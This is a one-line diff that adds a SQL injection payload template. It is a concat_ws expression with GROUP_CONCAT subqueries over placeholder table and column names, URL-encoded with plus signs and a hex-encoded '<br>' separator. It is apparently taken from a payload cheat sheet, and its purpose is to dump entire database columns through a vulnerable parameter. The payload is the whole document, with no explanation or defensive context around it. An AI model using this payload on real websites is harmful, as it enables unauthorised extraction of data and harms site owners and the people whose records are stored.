@@ -1,0 +1,1 @@
+concat_ws((SELECT+GROUP_CONCAT(<column1>+SEPARATOR+0x3c62723e)+FROM+<table>),'<br>',(SELECT+GROUP_CONCAT(<column2>+SEPARATOR+0x3c62723e)+FROM+<table>))
